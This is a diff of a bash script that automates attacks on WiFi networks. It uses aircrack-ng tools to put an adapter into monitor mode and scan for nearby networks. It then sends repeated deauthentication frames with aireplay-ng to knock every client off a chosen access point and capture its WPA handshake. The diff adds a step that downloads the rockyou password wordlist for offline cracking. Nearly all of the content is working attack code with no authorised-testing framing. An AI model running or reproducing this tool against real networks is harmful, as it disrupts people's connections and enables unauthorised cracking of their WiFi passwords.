@@ -1,18 +1,59 @@
 #!/bin/bash
-sudo apt update
-sudo apt install aircrack-ng -y 
+#sudo apt update
+#sudo apt install aircrack-ng -y 
+#sudo apt install gnome-terminal -y
+#sudo apt install wget -y
 
-sudo airmon-ng check kill
+# INsert your wifi adapter here:
+wifi_adapter=wlan0
 
-# Check if wlan0 is available
-if iw dev wlan0 info &> /dev/null; then
-    # Check if wlan0 is already in monitor mode
-    if iwconfig wlan0 | grep -q "Mode:Monitor"; then
-        :
-    else
-        # Start wlan0 in monitor mode
-        sudo airmon-ng start wlan0
+
+
+check_wordlist() {
+    wordlists_dir="/usr/share/wordlists"
+    rockyou_file="$wordlists_dir/rockyou.txt"
+    rockyou_gz="$wordlists_dir/rockyou.txt.gz"
+
+    # Check if /usr/share/wordlist directory exists, if not, create it
+    if [ ! -d "$wordlists_dir" ]; then
+        sudo mkdir -p "$wordlists_dir"
+        echo "wordlist folder created"
     fi
+
+    # Check if rockyou.txt exists, if yes, continue code
+    if [ -f "$rockyou_file" ]; then
+        echo "rockyou.txt found."
+        # Continue your code here
+    else
+        # Check if rockyou.gz exists, if yes, unzip it
+        if [ -f "$rockyou_gz" ]; then
+            echo "rockyou.gz found. Unzipping..."
+            sudo gzip -d "$rockyou_gz"
+            # Continue your code here
+        else
+            echo "Downloading the rockyou file..."
+            sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
+            wait
+        fi
+    fi
+}
+
+# Call the function
+check_wordlist
+
+
+#sudo airmon-ng check kill
+
+
+# Check if $wifi_adapter is available
+if iw dev "$wifi_adapter" info &>/dev/null; then
+    echo "Starting $wifi_adapter in monitor mode"
+    sudo airmon-ng start "$wifi_adapter"
+elif iw dev "$wifi_adapter"mon info &>/dev/null; then
+    echo "Great! The adapter already in monitor mode"
+else
+    echo "the wifi adapter: $wifi_adapter not found or inaccessible"
+    exit 1
 fi
 
 
@@ -21,17 +62,21 @@ current_date=$(date +"%d_%m_%y")
 path="/home/$UN/Desktop/wifi_Targets"
 scan_input="$path/Scan/Scan-$current_date.csv"
 mkdir -p "$path"
-mkdir -p "$path/Scan"
+if [ -d "$path/Scan" ]; then
+    rm -rf "$path/Scan"
+fi
+mkdir "$path/Scan"
 sudo chown -R $UN:$UN $path
 
-clear
+#clear
 
 
 function network_scanner() {
-	clear
+	#clear
         # Scan 10 seconds for wifi networks
-        sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng wlan0mon --ignore-negative-one --output-format csv -w $path/Scan/Scan-$current_date
-
+        
+        sudo gnome-terminal --geometry=93x35-10000-10000 -- timeout 10s sudo airodump-ng "$wifi_adapter"mon --ignore-negative-one --output-format csv -w $path/Scan/Scan-$current_date
+        
         countdown_duration=10
         echo -e "\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
 
@@ -48,9 +93,8 @@ function network_scanner() {
         awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
         awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
         awk '$4 != ""' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
-        tail -n +3 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
-        head -n -2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
-
+        tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
+        head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
         clear
         echo -e "\033[1;33mAvalible WiFi Networks:\033[0m\n"
 
@@ -125,15 +169,17 @@ function network_scanner() {
         fi
         mkdir $path/"$bssid_name"
 
-        echo -e "\nScanning if the network still available"
-        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
+        echo -e "\nChecking if the network available.."
+        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$path/$bssid_name/airodump_output.txt"
         sleep 10
+        check_var="inside network_scanner func"
 }
 
 
 function another_scan_prompt() {
 	while true; do
-	    read -p "Do you want to run another scan? (Y/N): " answer
+	    echo $check_var
+	    read -p "Do you want to run another scan? (Y/n): " answer
 	    case $answer in
 		[Yy]* ) network_scanner;;
 		[Nn]* ) echo -e "\nBye." && exit 1;;
@@ -142,12 +188,15 @@ function another_scan_prompt() {
 	done
 }
 
+
 # Use scan function
 network_scanner
 
 
 # Check if the Network is available
 while [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2 ]; do
+    check_var="inside while loop"
+    echo $check_var
     sudo pkill airodump-ng
     echo -e "\033[1mNetwork appears to be offline now.\033[0m"
     another_scan_prompt
@@ -198,7 +247,7 @@ else
         target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
         
         for target_device in $target_devices; do
-            gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon
+            gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
         done
         
         echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
@@ -251,5 +300,15 @@ fi
 
 
 
-gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop wlan0mon
+gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop "$wifi_adapter"mon
 gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
+
+
+
+# Fix:
+#
+
+# To Do:
+# - Add sort by power
+# - hushcut - gpu
+# - add more wordlists 
